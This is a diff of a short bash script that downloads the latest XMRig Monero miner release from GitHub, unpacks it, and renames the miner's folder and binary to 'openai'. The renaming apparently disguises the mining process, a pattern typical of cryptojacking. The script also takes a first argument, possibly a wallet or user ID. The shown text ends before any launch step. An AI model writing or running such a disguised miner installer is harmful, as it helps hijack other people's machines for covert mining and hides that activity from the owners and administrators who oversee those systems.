@@ -1,9 +1,10 @@
 #!/bin/bash
 
 U=$1
-wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-static-x64.tar.gz 
+latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
+wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
 tar -zxvf 1.tar.gz
-mv xmrig-6.21.1 openai
+mv xmrig-$latest openai
 mv openai/xmrig openai/openai
 random_number=$RANDOM
 rm -rf 1.tar.gz
